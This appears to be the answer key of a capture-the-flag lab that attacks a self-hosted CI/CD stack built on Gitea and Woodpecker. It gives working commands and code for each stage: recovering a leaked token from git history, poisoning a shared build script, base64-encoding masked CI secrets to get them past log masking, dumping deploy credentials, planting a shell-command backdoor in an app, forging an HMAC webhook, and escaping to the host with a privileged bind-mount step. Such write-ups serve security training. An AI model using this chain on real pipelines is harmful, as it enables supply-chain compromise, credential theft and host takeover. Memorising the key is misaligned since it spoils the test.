# Freightpipe — Reference Solution (spoiler)

"The Software Factory." Sparrow Freight's self-hosted DevOps stack: Gitea (SCM) + Woodpecker CI +
an internal registry + an auto-deploying prod host + a "deploy reviewer" bot. One sysbox pod runs the
whole docker-compose; only Gitea's web/ssh, the Woodpecker web UI (read-only), and the prod app are
reachable by the player.

Four flags, one per stage. Each stage is an understanding gate — no single tool solves it.

Player-facing services (per-team instance):
- Gitea:      http://<host>:<web_port>            (web + git http)
- Woodpecker: http://<host>:<woodpecker_port>     (read-only build logs — public repo visibility)
- prod app:   http://<host>:<prod_port>           (the live product + its /deploy webhook)

---

## Stage 0 — recon → contributor foothold  →  FLAG 1

Register/known creds aren't given; the way in is a **leaked token in git history**. The public
`freightpipe-scripts` repo committed then removed `.env.deploy`:

```
git clone http://<host>:<web>/dev/freightpipe-scripts.git && cd freightpipe-scripts
git log --all -p | grep -A2 GITEA_TOKEN        # recover the contributor PAT
```

The PAT is scoped `read:repository, write:repository` for the **contributor** user. It can read the
private `freightpipe-internal` repo → **FLAG1**:

```
curl -H "Authorization: token <PAT>" http://<host>:<web>/api/v1/repos/dev/freightpipe-internal/raw/FLAG1.txt
```

The same PAT can WRITE `freightpipe-scripts` but is **blocked from `prod-app`** (private, non-collaborator —
the only reliable Gitea write-block). That constraint forces the indirect path below.

## Stage 1 — indirect pipeline poisoning → CI RCE  →  user.txt

`prod-app`'s deploy pipeline (`.woodpecker.yml`, which you can't edit) runs `scripts/build.sh`
**fetched from the writable `freightpipe-scripts` repo** on every build. Poison it:

```sh
# in freightpipe-scripts, using the leaked PAT to push:
cat > scripts/build.sh <<'EOF'
#!/bin/sh
id                                   # -> uid=0 in the CI job (RCE)
echo "user=$(printf %s "$USER_FLAG" | base64)"   # see stage 1.5
EOF
git commit -am x && git -c http.extraHeader="Authorization: token <PAT>" push
```

The **review-bot** triggers a `prod-app` deploy build on a fixed interval → your build.sh runs →
RCE in the CI job. Read the output in the (public) Woodpecker build log.

### Stage 1.5 — the CI secret is masked
`user.txt` is injected into the build as a Woodpecker **secret** (`USER_FLAG`). `echo $USER_FLAG`
prints `********` — Woodpecker masks secret values in logs. Defeat it by transforming the value:
`base64`, `rev`, `xxd`, … The build log then shows the encoded flag → decode → **user.txt**.

## Stage 2 — loot the deploy pipeline

The same build env also holds the deploy credentials (Woodpecker secrets). Dump + decode them:

```sh
echo "loot=$(env | grep -E 'REGISTRY_TOKEN|WEBHOOK_SECRET|DEPLOY_URL' | base64 | tr -d '\n')"
```

You now have `REGISTRY_TOKEN`, `WEBHOOK_SECRET`, and the prod `DEPLOY_URL`. Reading the pipeline
(prod-app is publicly viewable in Woodpecker) shows the deploy flow: build image → push
`registry:5000/prod-app:latest` → prod deploys `:latest` on an **HMAC-signed** webhook.

## Stage 3 — backdoor the image + forge the webhook → prod RCE  →  FLAG 3

The app source + Dockerfile also live in the writable `freightpipe-scripts` repo, so you control what
gets baked into `prod-app:latest`. Backdoor the app:

```python
# freightpipe-scripts/app/main.py — add a command endpoint
if "cmd" in q: out = subprocess.run(["/bin/sh","-c",q["cmd"][0]], capture_output=True, text=True)
```

Push it → the bot's next build has kaniko bake your backdoor into `:latest`. Now **forge the deploy
webhook** with the looted secret (GitHub-style `X-Hub-Signature-256`):

```sh
BODY='{"image":"prod-app:latest"}'
SIG=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" | awk '{print $2}')
curl -X POST -H "X-Hub-Signature-256: sha256=$SIG" -d "$BODY" http://<host>:<prod>/deploy
```

prod pulls + runs your backdoored `:latest`. Hit the backdoor → it runs as prod and reads the
**production runtime secrets** injected only into the deployed container:

```
curl 'http://<host>:<prod>/?cmd=env'      # -> FLAG3  +  PROD_APP_WRITE_TOKEN
```

`FLAG3` is stage 3. `PROD_APP_WRITE_TOKEN` is the stage-4 pivot — a Gitea token that **can write the
trusted `prod-app` repo**.

## Stage 4 — Woodpecker trusted-repo privileged step → factory-host root  →  root.txt

`prod-app` is a **trusted** Woodpecker repo (its deploy pipeline was granted trust). With the deploy
token you can finally edit `prod-app`'s `.woodpecker.yml` and add a **privileged step with a host
bind-mount** — which a trusted repo is allowed to run:

```yaml
skip_clone: true
steps:
  escape:
    image: alpine
    privileged: true
    volumes:
      - /:/host
    commands:
      - cat /host/root.txt        # factory-host root
```

```sh
git clone http://.../dev/prod-app.git   # now works with the deploy token
# write the yml above, then:
git -c http.extraHeader="Authorization: token <DEPLOY_TOKEN>" push
```

The bot runs it → a privileged container (uid=0, all caps) with the factory host mounted → **root.txt**
in the build log. Game over.

---

## Why each gate is real (anti-guess / anti-cheese)
- Stage 0: PAT is in history, not HEAD — must actually walk `git log --all -p`.
- Stage 1: prod-app is private+non-collab → no direct edit; the ONLY influence is the shared build.sh.
- Stage 1.5: secret masking forces an encoding step (real CI-exfil skill).
- Stage 2→3: image backdoor via I-PPE + HMAC forge (craft a signed request) — not a crypto grind.
- Stage 4: privileged is gated behind (a) the looted deploy token = prod-app write, AND (b) prod-app
  being a trusted repo. The stage-1 CI job is UNPRIVILEGED and has no docker socket, so the ONLY
  privileged path to the host is this stage-4 trusted-repo step. One intended root.
